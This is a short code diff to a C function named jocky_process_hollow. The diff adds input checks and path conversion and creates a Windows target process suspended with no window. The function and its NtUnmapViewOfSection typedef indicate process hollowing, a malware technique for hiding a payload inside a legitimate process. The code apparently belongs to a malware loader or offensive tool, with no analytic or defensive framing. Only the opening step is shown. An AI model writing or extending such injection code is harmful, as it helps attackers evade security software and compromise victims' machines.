@@ -20,18 +20,21 @@ typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
     HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 
-bool jocky_process_hollow(const wchar_t* target_path,
-                          const uint8_t* payload,
-                          size_t payload_size)
+bool jocky_process_hollow(const char* target_path,
+                          int8_t* payload,
+                          int32_t payload_size)
 {
-    (void)payload_size;
+    if (!target_path || !payload || payload_size <= 0) return false;
+
+    wchar_t wtarget[MAX_PATH];
+    MultiByteToWideChar(CP_UTF8, 0, target_path, -1, wtarget, MAX_PATH);
 
     /* 1. Create the target process suspended */
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
 
-    if (!CreateProcessW(target_path, NULL, NULL, NULL, FALSE,
+    if (!CreateProcessW(wtarget, NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED | CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi)) {
         return false;
